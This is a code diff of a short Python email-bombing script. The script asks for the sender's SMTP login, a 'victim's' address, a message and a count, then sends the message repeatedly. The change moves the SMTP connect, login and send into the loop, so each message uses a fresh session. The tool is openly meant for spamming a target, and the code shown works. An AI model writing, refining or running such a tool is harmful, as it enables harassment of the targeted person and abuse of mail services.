@@ -42,19 +42,17 @@ upass = input("Enter Your password: ")
 rmail = input("Enter victim\'s Email: ")
 message = input("Enter the message you want to send: ")
 threads1 = input("Enter The amount of threads you want to send: ")
-s = smtplib.SMTP(prot, port10)
-
-s.starttls()
-
-s.login(uname, upass)
-
-msg = message
 
 print("\nspamming "+rmail+" please wait!")
 
 for i in range(int(threads1)):
-   s.sendmail(uname, rmail, msg)
-   
-print("\nspam done!")
 
-s.quit()
+  s = smtplib.SMTP(prot, port10)
+
+  s.starttls()
+
+  s.login(uname, upass)
+
+  msg = message
+  s.sendmail(uname, rmail, msg)
+  s.quit()
